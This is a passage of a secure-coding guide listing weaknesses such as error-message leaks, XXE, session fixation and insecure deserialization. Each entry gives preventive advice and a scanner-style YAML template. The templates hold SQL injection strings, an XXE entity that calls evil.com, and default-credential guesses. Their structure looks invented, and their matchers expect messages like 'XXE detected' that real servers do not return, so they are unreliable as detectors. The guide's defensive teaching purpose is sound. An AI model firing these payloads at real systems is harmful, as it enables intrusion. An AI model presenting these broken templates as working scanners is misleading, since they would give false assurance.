By implementing these preventive measures, you can minimize the risk of exposing sensitive information in error messages and enhance the security of your application. It is crucial to prioritize the protection of sensitive data and regularly review and update your error handling mechanisms to ensure they align with best practices and evolving security standards.


```
id: error-message-leak
info:
  name: Generation of Error Message Containing Sensitive Information
  author: Your Name
  severity: high
  description: Detects potential leakage of sensitive information in error messages.
  references:
    - https://example.com
tags:
  - web
  - error-message-leak
requests:
  - name: Error Message Leakage Test
    path:
      - /
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: "/login"
            headers:
              Content-Type: application/x-www-form-urlencoded
            body:
              username: "{{.Fuzz}}"
              password: "password"
            fuzz:
              - "' OR '1'='1"
              - "' OR 'a'='a"
              - "' OR '1'='1' --"
```



### Unprotected storage of credentials

Unprotected storage of credentials refers to the practice of storing sensitive credentials, such as usernames, passwords, API keys, or access tokens, in an insecure manner. This can include storing credentials in plain text, using weak encryption, or storing them in easily accessible locations, making them vulnerable to unauthorized access and potential misuse by attackers.

To prevent unprotected storage of credentials, you should follow these preventive measures:

1. Use secure credential storage mechanisms: Utilize secure methods for storing credentials, such as secure databases, encrypted files, or dedicated credential management systems. These mechanisms should provide strong encryption and access controls to protect the confidentiality and integrity of the stored credentials.

1. Avoid storing plain text passwords: Never store passwords or sensitive credentials in plain text. Instead, use strong cryptographic techniques, such as one-way hashing with salt or key derivation functions, to securely store and verify passwords.

1. Implement strong encryption: If you need to store credentials in a file or database, ensure that the data is encrypted using robust encryption algorithms and keys. Utilize industry-standard encryption libraries and algorithms to protect the credentials from unauthorized access.

1. Separate credentials from source code: Avoid storing credentials directly in source code or configuration files that are part of version control systems. Separate the credentials from the codebase and use environment-specific configuration files or secure secrets management tools to provide the necessary credentials during runtime.

1. Securely manage API keys and access tokens: When working with API keys or access tokens, follow best practices provided by the respective service or framework. Avoid hardcoding these credentials and instead use secure environment variables or dedicated configuration files to store and retrieve them.

1. Implement access controls: Enforce proper access controls to limit access to sensitive credentials. Grant access only to authorized individuals who require it for their specific roles or tasks. Regularly review and update access permissions to ensure that only trusted individuals have access to the credentials.

1. Regularly rotate credentials: Implement a credential rotation policy that mandates periodic password changes, key rotation, or the issuance of new access tokens. Regularly rotating credentials reduces the risk of long-term exposure and unauthorized access to sensitive systems.

1. Monitor and log credential access: Implement logging and monitoring mechanisms to track access to sensitive credentials. Regularly review logs for any suspicious or unauthorized access attempts. Monitoring helps detect any potential breaches or unauthorized usage of credentials.

1. Educate users about secure credential management: Provide training and awareness programs to educate users and developers about the importance of secure credential management practices. Emphasize the risks associated with unprotected storage of credentials and promote secure coding and handling techniques.

1. Regularly assess and audit: Conduct regular security assessments and audits to identify any potential vulnerabilities or weaknesses in the storage and management of credentials. Utilize automated scanning tools or engage security professionals to perform thorough assessments.

By implementing these preventive measures, you can significantly reduce the risk of unprotected storage of credentials and enhance the security of your application and systems. Safeguarding sensitive credentials is crucial for protecting user data, preventing unauthorized access, and maintaining the trust of your users.


```
id: unprotected-credentials
info:
  name: Unprotected Storage of Credentials
  author: Your Name
  severity: high
  description: Detects unprotected storage of sensitive credentials.
  references:
    - https://example.com
tags:
  - web
  - unprotected-credentials
requests:
  - name: Unprotected Credential Storage Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/config"
          - method: GET
            path: "/credentials"
```


### Trust Boundary Violation

Trust Boundary Violation refers to a security vulnerability that occurs when data or control crosses a trust boundary without proper validation or authorization. It happens when data from an untrusted source is treated as trusted or when there is a failure to enforce proper access controls at the boundary between trusted and untrusted components or systems. This violation can lead to unauthorized access, data breaches, privilege escalation, or the execution of malicious code.

To prevent Trust Boundary Violation, you should follow these preventive measures:

1. Validate and sanitize inputs: Validate and sanitize all inputs received from untrusted sources, such as user input, API calls, or data from external systems. Implement strict input validation and filtering techniques to ensure that only safe and expected data is passed across trust boundaries.

1. Implement strong authentication and authorization: Enforce robust authentication and authorization mechanisms to ensure that only authorized entities can access sensitive resources or perform critical operations. Implement access controls at trust boundaries to prevent unauthorized access.

1. Apply the principle of least privilege: Grant users, components, or systems only the minimum privileges necessary to perform their tasks. Avoid giving unnecessary permissions or elevated privileges that can potentially lead to trust boundary violations.

1. Use secure communication protocols: When data crosses trust boundaries, ensure that secure communication protocols, such as SSL/TLS, are used to protect the confidentiality and integrity of the data in transit. Encrypt sensitive data to prevent interception or tampering.

1. Implement secure session management: If sessions are used to maintain user state or context, ensure that proper session management practices are followed. Use secure session tokens, enforce session timeouts, and protect against session fixation or session hijacking attacks.

1. Segregate and isolate components: Clearly define and enforce trust boundaries between different components or systems. Isolate untrusted components or systems from trusted ones to minimize the impact of a potential breach or compromise.

1. Regularly update and patch: Keep all components, frameworks, libraries, and systems up to date with the latest security patches. Regularly review and update security configurations to address any known vulnerabilities that may lead to trust boundary violations.

1. Implement runtime monitoring and anomaly detection: Deploy monitoring systems that can detect and alert on unusual or unexpected behaviors across trust boundaries. Monitor for suspicious activities, unexpected data flows, or unauthorized access attempts.

1. Perform security testing and code reviews: Conduct regular security testing, including penetration testing and code reviews, to identify and address any trust boundary vulnerabilities. Test the resilience of your system to boundary violations and validate the effectiveness of implemented security controls.

1. Provide security awareness training: Educate developers and system administrators about the risks and consequences of trust boundary violations. Promote security awareness and provide training on secure coding practices, secure configuration management, and the importance of enforcing trust boundaries.

By following these preventive measures, you can mitigate the risk of trust boundary violations and enhance the overall security posture of your application or system. It is crucial to establish clear trust boundaries, implement appropriate security controls, and regularly monitor and update your systems to prevent unauthorized access or compromise across trust boundaries.


```
id: trust-boundary-violation
info:
  name: Trust Boundary Violation
  author: Your Name
  severity: medium
  description: Detects trust boundary violations in the application.
  references:
    - https://example.com
tags:
  - web
  - trust-boundary-violation
requests:
  - name: Trust Boundary Violation Test
    path:
      - /
      - /admin
      - /user
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/user-details?admin=true"
          - method: GET
            path: "/admin-details?user=true"
```


### Insufficiently Protected Credentials

Insufficiently Protected Credentials is a security vulnerability that occurs when sensitive credentials, such as usernames, passwords, API keys, or access tokens, are not adequately protected, making them susceptible to unauthorized access or misuse. This can happen due to weak encryption, improper storage, or inadequate access controls, putting sensitive information at risk.

To prevent Insufficiently Protected Credentials, you should follow these preventive measures:

1. Use strong encryption: Ensure that sensitive credentials are properly encrypted using strong encryption algorithms and keys. Employ industry-standard encryption practices to protect the confidentiality and integrity of the stored credentials.

1. Implement secure storage mechanisms: Store credentials in secure storage systems, such as encrypted databases or secure key stores, that provide appropriate access controls and protection against unauthorized access. Avoid storing credentials in plain text or insecurely accessible locations.

1. Avoid hardcoding credentials: Hardcoding credentials directly in source code or configuration files should be avoided. Instead, utilize environment variables, secure secrets management tools, or configuration files with restricted access to store and retrieve credentials.

1. Implement secure credential transmission: When transmitting credentials, use secure communication protocols such as SSL/TLS to encrypt the data in transit. Avoid transmitting credentials over insecure channels or including them in URL parameters.

1. Apply the principle of least privilege: Grant credentials only the minimum privileges required for the intended functionality. Avoid providing unnecessary or excessive privileges to reduce the potential impact of a credential compromise.

1. Enforce strong password policies: Implement strong password policies that encourage users to create complex and unique passwords. Enforce password expiration and provide mechanisms for password resets or account recovery.

1. Implement multi-factor authentication (MFA): Utilize MFA to add an extra layer of security. Require users to provide additional authentication factors, such as a time-based one-time password (TOTP) or biometric data, to access sensitive resources.

1. Regularly rotate credentials: Establish a credential rotation policy that mandates periodic password changes, key rotation, or token regeneration. Regularly update and rotate credentials to limit the exposure window in case of a compromise.

1. Implement secure coding practices: Follow secure coding practices to minimize the risk of inadvertently exposing credentials. Avoid logging or displaying credentials in error messages or debug output. Implement secure coding techniques to protect against common vulnerabilities like injection attacks.

1. Conduct regular security assessments: Perform regular security assessments and penetration testing to identify vulnerabilities and weaknesses in credential protection. Engage security professionals or utilize automated vulnerability scanning tools to identify potential issues.

1. Educate users and developers: Raise awareness among users and developers about the importance of protecting credentials. Provide training on secure coding practices, password management, and the risks associated with insufficiently protected credentials.

By implementing these preventive measures, you can significantly reduce the risk of Insufficiently Protected Credentials and enhance the security of your systems. Protecting sensitive credentials is crucial for safeguarding user data, preventing unauthorized access, and maintaining the trust of your users.



```
id: insufficiently-protected-credentials
info:
  name: Insufficiently Protected Credentials
  author: Your Name
  severity: high
  description: Detects instances where sensitive credentials are insufficiently protected.
  references:
    - https://example.com
tags:
  - web
  - insufficiently-protected-credentials
requests:
  - name: Insufficiently Protected Credentials Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /login
            headers:
              - name: Content-Type
                value: application/x-www-form-urlencoded
            body: "username=admin&password=admin"
            matchers:
              - type: word
                words:
                  - "Invalid username or password"
```


### Restriction of XML External Entity Reference

Restriction of XML External Entity (XXE) Reference is a security vulnerability that occurs when an XML parser processes external entities included in the XML input. Attackers can exploit this vulnerability to read sensitive data from the server or perform denial-of-service attacks.

To prevent XXE vulnerabilities, you should follow these preventive measures:

1. Disable external entity processing: Configure the XML parser to disable the processing of external entities. This prevents the XML parser from resolving and including external entities in the XML input.

1. Validate and sanitize XML inputs: Implement proper input validation and sanitization techniques to ensure that only expected and safe XML data is processed. Use strict parsing settings and reject or sanitize any untrusted or unexpected XML input.

1. Use whitelisting and filtering: Implement whitelisting or filtering mechanisms to allow only known safe XML structures and reject or remove any potentially malicious XML constructs or elements.

1. Upgrade to a secure XML parser: Use the latest version of a secure and well-maintained XML parser library. Older versions of XML parsers may have known vulnerabilities that can be exploited by attackers.

1. Implement least privilege: Restrict access privileges of the XML parser to minimize the potential impact of an XXE attack. Ensure that the XML parser runs with the least privileges required to perform its functionality.

1. Avoid using user-controlled XML: Avoid using user-controlled XML in sensitive operations or processing. If user-supplied XML is required, ensure strict validation and sanitization of the input to mitigate the risk of XXE vulnerabilities.

1. Implement server-side filtering and input validation: Apply server-side input validation and filtering techniques to prevent XXE vulnerabilities. Validate and sanitize all XML data received from clients before processing it on the server.

1. Follow secure coding practices: Adhere to secure coding practices when handling XML data. Avoid concatenating XML strings or building XML dynamically using untrusted input, as it can introduce XML injection vulnerabilities.

1. Regularly update and patch: Keep the XML parser and associated libraries up to date with the latest security patches. Stay informed about any security advisories or updates related to the XML parser to address any known vulnerabilities.

1. Perform security testing: Conduct security testing, including vulnerability assessments and penetration testing, to identify and remediate XXE vulnerabilities. Test the resilience of the application against various XXE attack vectors and verify the effectiveness of implemented security controls.

By implementing these preventive measures, you can reduce the risk of XXE vulnerabilities and enhance the security of your XML processing. It is essential to be cautious when handling XML data, implement secure coding practices, and keep the XML parser up to date to prevent attackers from exploiting XXE vulnerabilities.


```
id: restriction-of-xxe-reference
info:
  name: Restriction of XML External Entity Reference
  author: Your Name
  severity: medium
  description: Detects instances where XML parsing allows external entity references, potentially leading to XXE vulnerabilities.
  references:
    - https://example.com
tags:
  - web
  - restriction-of-xxe-reference
requests:
  - name: Restriction of XXE Reference Test
    path:
      - /
      - /admin
      - /api
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /api/parse-xml
            headers:
              - name: Content-Type
                value: application/xml
            body: |
              <?xml version="1.0" encoding="UTF-8"?>
              <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
              <root>&xxe;</root>
            matchers:
              - type: word
                words:
                  - "XXE detected"
```


### Vulnerable and Outdated Components

Vulnerable and outdated components refer to third-party libraries, frameworks, or software components that have known security vulnerabilities or are no longer supported with security patches. Using such components can introduce security risks into your application or system, as attackers can exploit these vulnerabilities to gain unauthorized access or compromise your system.

To prevent the use of vulnerable and outdated components, you should follow these preventive measures:

1. Maintain an inventory of components: Create and maintain an inventory of all the third-party components used in your application or system. Keep track of the version numbers and the sources of these components.

1. Stay informed about security updates: Stay updated with the latest security advisories and vulnerability reports for the components you use. Subscribe to security mailing lists or follow official sources to receive notifications about security patches and updates.

1. Regularly update components: Regularly update the components in your application or system to the latest stable and secure versions. Check for security releases and apply the patches promptly. Ensure that your update process is well-documented and regularly tested.

1. Utilize vulnerability databases: Make use of vulnerability databases and security resources that provide information on known vulnerabilities in components. Check these resources regularly to identify any vulnerabilities in the components you use and take appropriate action.

1. Perform security assessments: Conduct regular security assessments and vulnerability scans to identify any vulnerabilities introduced by the components. Use automated tools or engage security professionals to perform security testing and code reviews.

1. Monitor component support: Keep track of the support status of the components you use. If a component is no longer maintained or has reached its end-of-life, consider finding alternative components or solutions. Unsupported components are more likely to have unpatched vulnerabilities.

1. Implement a patch management process: Establish a patch management process to ensure that security patches and updates are promptly applied to the components. This process should include testing patches in a controlled environment before deploying them to production.

1. Consider using security monitoring tools: Implement security monitoring tools that can detect and alert you about vulnerabilities or potential risks associated with the components you use. These tools can help you identify any security issues early on and take necessary mitigation steps.

1. Follow secure coding practices: Develop secure coding practices to minimize the introduction of vulnerabilities in your own code. Regularly review and update your code to ensure that it does not rely on vulnerable or outdated components.

1. Include component assessment in the procurement process: When selecting new components, consider their security track record, update frequency, and community support. Choose components that have a good reputation for security and are actively maintained.

By following these preventive measures, you can reduce the risk of using vulnerable and outdated components in your application or system. Regularly updating components, staying informed about security updates, and conducting security assessments are essential to maintain a secure software ecosystem.


```
id: vulnerable-and-outdated-components
info:
  name: Vulnerable and Outdated Components
  author: Your Name
  severity: high
  description: Detects vulnerable and outdated components in web applications.
  references:
    - https://example.com
tags:
  - web
  - vulnerable-and-outdated-components
requests:
  - name: Vulnerable and Outdated Components Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /info
            headers:
              - name: User-Agent
                value: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
            matchers:
              - type: word
                words:
                  - "Vulnerable component detected"
```


### Improper Validation of Certificate with Host Mismatch

Improper Validation of Certificate with Host Mismatch is a security vulnerability that occurs when a client application fails to properly validate the server's SSL/TLS certificate during a secure communication handshake. This vulnerability allows an attacker to impersonate the server by presenting a certificate that does not match the expected host.

To prevent Improper Validation of Certificate with Host Mismatch, you should follow these preventive measures:

1. Properly validate SSL/TLS certificates: Implement a robust certificate validation mechanism in your client application. Ensure that the SSL/TLS library or framework being used verifies the certificate chain, expiration date, revocation status, and other relevant fields.

1. Check for host name mismatch: Verify that the common name (CN) or subject alternative name (SAN) field in the certificate matches the host to which the client is connecting. Perform a strict comparison and reject the connection if there is a mismatch.

1. Use a trusted certificate authority (CA): Obtain SSL/TLS certificates from reputable CAs that follow industry best practices for certificate issuance. Trust certificates only from well-known CAs to reduce the risk of obtaining fraudulent or improperly issued certificates.

1. Implement certificate pinning: Consider implementing certificate pinning, also known as public key pinning, in your client application. Pinning involves associating a specific server's public key or certificate fingerprint with a known and trusted value. This helps prevent certificate substitution attacks.

1. Stay up to date with CA revocations: Regularly update the list of revoked certificates and perform certificate revocation checks during the validation process. Check certificate revocation status using online certificate revocation lists (CRLs) or the Online Certificate Status Protocol (OCSP).

1. Enable strict SSL/TLS configuration: Configure your SSL/TLS settings to use secure and up-to-date protocols (e.g., TLS 1.2 or higher) and cryptographic algorithms. Disable deprecated or weak protocols and algorithms to prevent potential vulnerabilities.

1. Perform thorough testing: Conduct rigorous testing to ensure that certificate validation is working correctly in your client application. Test scenarios should include cases where certificates have expired, are revoked, or have host mismatches. Automated security testing tools can also help identify potential vulnerabilities.

1. Implement user awareness and education: Educate users about the importance of verifying SSL/TLS certificates and recognizing warning messages related to certificate errors. Encourage users to report any suspicious certificate-related issues.

1. Monitor and log certificate validation errors: Implement logging mechanisms to capture and monitor SSL/TLS certificate validation errors. Monitor logs for any unexpected or suspicious activities related to certificate validation.

1. Regularly update SSL/TLS libraries and frameworks: Keep your SSL/TLS libraries and frameworks up to date with the latest security patches and updates. This ensures that you have the latest fixes for any known vulnerabilities related to certificate validation.

By following these preventive measures, you can mitigate the risk of Improper Validation of Certificate with Host Mismatch and ensure secure SSL/TLS connections in your client applications. Proper certificate validation is crucial for establishing trust and authenticity during secure communications.


```
id: improper-validation-of-certificate-with-host-mismatch
info:
  name: Improper Validation of Certificate with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper validation of SSL/TLS certificates with host mismatches.
  references:
    - https://example.com
tags:
  - web
  - ssl-tls
  - certificate-validation
requests:
  - name: Certificate Host Mismatch Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /
            insecure: true
            matchers:
              - type: word
                words:
                  - "Certificate host mismatch detected"
```

### Improper Authentication

Improper Authentication is a security vulnerability that occurs when an application fails to properly authenticate and verify the identity of users or entities. This vulnerability allows attackers to bypass authentication mechanisms and gain unauthorized access to sensitive resources or perform actions on behalf of other users.

To prevent Improper Authentication, you should follow these preventive measures:

1. Implement strong authentication mechanisms: Use strong authentication methods, such as multi-factor authentication (MFA), to enhance the security of user authentication. MFA combines multiple factors, such as passwords, biometrics, or hardware tokens, to verify the user's identity.

1. Use secure password policies: Enforce strong password policies that require users to create complex passwords and regularly update them. Encourage the use of unique passwords for each application or service and consider implementing password strength indicators.

1. Protect authentication credentials: Safeguard authentication credentials, such as passwords, tokens, or session IDs, from unauthorized access or disclosure. Use secure storage mechanisms, such as hashing and encryption, to protect sensitive information related to authentication.

1. Implement secure session management: Ensure secure session management practices, such as generating unique session IDs, properly handling session expiration and invalidation, and using secure transport protocols (e.g., HTTPS) to transmit session-related data.

1. Enforce secure login controls: Implement measures to prevent common attacks, such as brute-force attacks and credential stuffing. Enforce account lockouts or introduce CAPTCHA challenges after a certain number of failed login attempts.

1. Implement secure password reset processes: Establish secure password reset processes that require additional verification steps to confirm the user's identity. This may include sending a verification email, asking security questions, or utilizing a secondary authentication factor.

1. Protect against session fixation attacks: Implement measures to prevent session fixation attacks by regenerating session IDs upon successful authentication, avoiding session ID propagation in URLs, and restricting the ability to fixate session IDs.

1. Implement secure account recovery: Establish secure procedures for account recovery to ensure that only authorized users can regain access to their accounts. This may involve verifying the user's identity through a multi-step verification process.

1. Regularly update and patch: Keep the authentication mechanisms, libraries, and frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the authentication mechanisms used in your application.

1. Conduct security testing: Perform regular security testing, including vulnerability assessments and penetration testing, to identify and remediate any authentication-related vulnerabilities. Test the effectiveness of authentication controls and verify that they cannot be easily bypassed or exploited.

By implementing these preventive measures, you can mitigate the risk of Improper Authentication and strengthen the security of user authentication in your application or system. Robust authentication practices are essential to protect user accounts, sensitive data, and ensure that only authorized individuals can access protected resources.


```
id: improper-authentication-with-host-mismatch
info:
  name: Improper Authentication with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper authentication mechanisms that allow host mismatches.
  references:
    - https://example.com
tags:
  - web
  - authentication
  - host-mismatch
requests:
  - name: Host Mismatch Authentication Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - admin:password
              - user:password
            separator: ":"
        requests:
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Authentication failed: host mismatch detected"
```

### Session Fixation

Session Fixation is a security vulnerability that occurs when an attacker establishes or manipulates a user's session identifier (session ID) to gain unauthorized access to the user's session. The attacker tricks the user into using a known session ID, which the attacker can then use to hijack the session.

To prevent Session Fixation, you should follow these preventive measures:

1. Regenerate session ID upon authentication: Generate a new session ID for the user upon successful authentication. This ensures that the user is assigned a different session ID than the one initially used before authentication.

1. Use a secure random session ID: Generate session IDs using a strong cryptographic random number generator. This helps prevent session ID prediction or brute-force attacks where attackers try to guess valid session IDs.

1. Implement session expiration and inactivity timeouts: Set appropriate session expiration and inactivity timeouts to limit the lifespan of a session. When a session expires or times out, the user needs to reauthenticate, preventing the use of old session IDs by attackers.

1. Implement secure session management: Implement secure session management practices, such as securely transmitting session IDs over encrypted channels (e.g., HTTPS) and avoiding exposing session IDs in URLs.

1. Avoid session ID disclosure: Avoid including session IDs in URLs, logs, or other client-side visible locations. Exposing session IDs increases the risk of session fixation attacks as attackers can easily obtain valid session IDs.

1. Use cookie attributes: Set secure attributes for session cookies, such as the "Secure" flag to ensure they are only transmitted over HTTPS, and the "HttpOnly" flag to prevent client-side scripts from accessing the cookie.

1. Conduct user awareness and education: Educate users about session security best practices, such as the importance of logging out after using shared or public devices and being cautious of session ID manipulation attempts.

1. Implement IP validation: Consider implementing IP validation checks as an additional security measure. Verify that the IP address of the user's requests remains consistent throughout the session. This can help detect and prevent session hijacking attempts.

1. Monitor session activity: Monitor session activity and log events related to session creation, expiration, and invalidation. Monitor for unusual session behavior, such as simultaneous sessions from different locations or devices.

1. Regularly update and patch: Keep your web application and session management components up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to session management in your application framework or libraries.

By implementing these preventive measures, you can reduce the risk of Session Fixation and help ensure the integrity and security of user sessions. Secure session management practices are essential to protect user accounts and prevent unauthorized access to sensitive data and functionality.


```
id: session-fixation
info:
  name: Session Fixation
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to session fixation attacks.
  references:
    - https://example.com
tags:
  - web
  - session-fixation
requests:
  - name: Session Fixation Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - johndoe@example.com
              - janedoe@example.com
          - type: wordlist
            words:
              - 123456
              - password123
        requests:
          - method: GET
            path: /set-session-id
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Session ID mismatch detected"
```


### Inclusion of Functionality from Untrusted Control

Inclusion of Functionality from Untrusted Control, also known as Remote Code Execution (RCE), is a security vulnerability that occurs when an application incorporates and executes code from an untrusted or external source without proper validation or security measures. This vulnerability allows attackers to execute arbitrary code on the target system, potentially leading to unauthorized access, data breaches, or system compromise.

To prevent the Inclusion of Functionality from Untrusted Control, you should follow these preventive measures:

1. Avoid dynamic code execution: Minimize or avoid executing code from untrusted sources whenever possible. Limit the execution of code to trusted and well-defined components within your application.

1. Implement strict input validation: Validate and sanitize all user inputs and external data before using them in dynamic code execution. Apply input validation techniques such as whitelisting, blacklisting, or input filtering to ensure only safe and expected inputs are processed.

1. Use safe alternatives for dynamic code execution: If dynamic code execution is necessary, consider using safe alternatives, such as predefined functions or libraries with built-in security measures. Avoid using functions or features that allow arbitrary code execution or evaluation.

1. Implement strong access controls: Apply strict access controls and permissions to limit the execution of code or the inclusion of functionality to trusted and authorized sources only. Restrict access to critical system resources and prevent unauthorized code execution.

1. Isolate untrusted code: If you need to execute untrusted code, isolate it in a sandboxed or restricted environment with limited privileges. Use technologies like containers or virtual machines to create isolated execution environments.

1. Implement code signing and verification: Digitally sign your code and verify the integrity and authenticity of external components before including or executing them. This helps ensure that the code comes from a trusted source and has not been tampered with.

1. Regularly update and patch: Keep your application, libraries, and frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the components used in your application.

1. Perform security testing: Conduct regular security testing, including static code analysis, dynamic analysis, and penetration testing, to identify and mitigate vulnerabilities related to the inclusion of untrusted functionality. Test for code injection and RCE vulnerabilities to ensure the application can withstand potential attacks.

1. Implement secure coding practices: Follow secure coding practices, such as input validation, output encoding, and secure configuration management, to minimize the risk of code injection vulnerabilities. Train your development team on secure coding practices to build a robust and secure application.

1. Implement a Web Application Firewall (WAF): Consider using a WAF that can detect and block malicious code injection attempts. WAFs can provide an additional layer of protection by inspecting incoming requests and filtering out potentially dangerous code.

By implementing these preventive measures, you can reduce the risk of Inclusion of Functionality from Untrusted Control and enhance the security of your application. Proper validation, access controls, and secure coding practices are essential to mitigate the risks associated with executing code from untrusted sources.

```
id: untrusted-control-inclusion
info:
  name: Inclusion of Functionality from Untrusted Control
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to the inclusion of functionality from untrusted sources.
  references:
    - https://example.com
tags:
  - web
  - untrusted-control
requests:
  - name: Inclusion of Untrusted File
    path:
      - /index.php?page=untrusted
      - /admin.php?page=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted Functionality Included"
```


### Download of Code Without Integrity Check


Download of Code Without Integrity Check is a security vulnerability that occurs when code or files are downloaded from a remote source without verifying their integrity. This vulnerability allows attackers to manipulate or replace the downloaded code, leading to potential injection of malicious code or unauthorized modifications.

To prevent Download of Code Without Integrity Check, you should follow these preventive measures:

1. Implement code signing: Digitally sign the code or files you distribute or download. Code signing ensures that the code or files have not been tampered with and come from a trusted source. Verify the digital signatures before executing or using the downloaded code.

1. Use secure and trusted sources: Obtain code or files from trusted and reputable sources. Avoid downloading code or files from untrusted or unknown sources. Trusted sources provide assurance of the integrity and authenticity of the code.

1. Verify checksums or hashes: Provide checksums or hashes (e.g., MD5, SHA-256) for the downloaded code or files. Before using the downloaded content, calculate the checksum or hash of the file and compare it with the provided value. If they match, it indicates that the file has not been altered during the download process.

1. Use secure protocols: Download code or files using secure protocols such as HTTPS, which provides encryption and integrity checks during transmission. Secure protocols help prevent tampering or interception of the downloaded content.

1. Perform file integrity checks: Implement file integrity checks after the download process. This can include comparing the downloaded code or files against a known good version or using file integrity monitoring tools to detect any unauthorized modifications.

1. Regularly update and patch: Keep the software or application that handles the downloading process up to date with the latest security patches and updates. Security vulnerabilities in the download functionality can be addressed through software updates.

1. Implement secure coding practices: Follow secure coding practices when developing the code that handles the download process. Input validation, secure file handling, and secure network communication should be considered to prevent code injection or tampering during the download.

1. Implement strong access controls: Restrict access to the download functionality and ensure that only authorized users or systems can initiate or access the download process. Implement proper authentication and authorization mechanisms to prevent unauthorized downloads.

1. Perform security testing: Conduct regular security testing, including vulnerability scanning and penetration testing, to identify potential weaknesses or vulnerabilities in the download functionality. Test for code injection, tampering, or unauthorized file replacement scenarios.

1. Educate users: Educate users about the importance of downloading code or files from trusted sources and the risks associated with downloading from untrusted or unknown sources. Encourage users to verify the integrity of downloaded files using provided checksums or hashes.

By implementing these preventive measures, you can reduce the risk of Download of Code Without Integrity Check and ensure that the downloaded code or files are trustworthy and have not been tampered with. Verifying integrity, using secure sources, and implementing secure coding practices are critical for maintaining the integrity and security of downloaded code or files.


```
id: download-without-integrity-check
info:
  name: Download of Code Without Integrity Check
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to downloading code without integrity checks.
  references:
    - https://example.com
tags:
  - web
  - download-code
requests:
  - name: Untrusted Code Download
    path:
      - /download.php?file=untrusted
      - /file.php?name=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Downloaded code without integrity check"
```


### Deserialization of Untrusted Data

Deserialization of Untrusted Data is a security vulnerability that occurs when untrusted or malicious data is deserialized by an application without proper validation and safeguards. Deserialization vulnerabilities can lead to various attacks, such as remote code execution, injection of malicious objects, or data tampering.

To prevent Deserialization of Untrusted Data, you should follow these preventive measures:

1. Implement input validation: Validate and sanitize all inputs, including serialized data, before deserialization. Apply strict input validation to ensure that only expected and safe data is processed.

1. Use secure deserialization libraries: Utilize secure and trusted deserialization libraries or frameworks that provide built-in protections against common deserialization vulnerabilities. These libraries often include features like input filtering, type checking, or automatic validation.

1. Implement whitelisting: Define and enforce a whitelist of allowed classes or types during deserialization. Restrict the deserialization process to only known and trusted classes, preventing the instantiation of potentially malicious or unexpected objects.

1. Implement integrity checks: Include integrity checks or digital signatures within the serialized data. Verify the integrity of the serialized data before deserialization to ensure that it has not been tampered with or modified.

1. Isolate deserialization functionality: Isolate the deserialization process in a separate and controlled environment. Use mechanisms like sandboxes, containers, or restricted execution environments to mitigate the impact of any potential deserialization vulnerabilities.

1. Enforce strict access controls: Limit access to deserialization functionality to only authorized components or systems. Implement proper authentication and authorization mechanisms to prevent unauthorized deserialization.

1. Implement secure defaults: Configure deserialization settings with secure defaults. Disable or minimize the use of dangerous deserialization features or options that may introduce security risks.

1. Update deserialization libraries: Keep deserialization libraries or frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the deserialization components used in your application.

1. Perform security testing: Conduct thorough security testing, including static analysis, dynamic analysis, and penetration testing, to identify and remediate deserialization vulnerabilities. Test for deserialization attacks, such as object injection or remote code execution.

1. Educate developers: Provide training and guidance to developers on secure coding practices, emphasizing the importance of proper validation and handling of deserialized data. Encourage developers to follow best practices for secure deserialization.

By implementing these preventive measures, you can mitigate the risk of Deserialization of Untrusted Data and protect your application from potential attacks. Validating inputs, using secure libraries, implementing access controls, and maintaining up-to-date software are essential steps to prevent deserialization vulnerabilities.

```
id: deserialization-untrusted-data
info:
  name: Deserialization of Untrusted Data
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the deserialization of untrusted data.
  references:
    - https://example.com
tags:
  - web
  - deserialization
requests:
  - name: Untrusted Deserialization
    path:
      - /deserialize.php?data=untrusted
      - /object.php?data=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted deserialization detected"
```


### Insufficient Logging

Insufficient Logging is a security vulnerability that occurs when an application fails to generate or retain sufficient logs to detect and investigate security incidents. Inadequate logging can hinder incident response efforts, making it difficult to identify and analyze security events or suspicious activities.

To prevent Insufficient Logging, you should follow these preventive measures:

1. Implement comprehensive logging: Ensure that your application logs relevant security-related events and activities. Log information such as user authentication attempts, access control failures, critical application actions, input validation errors, and any other security-sensitive events.

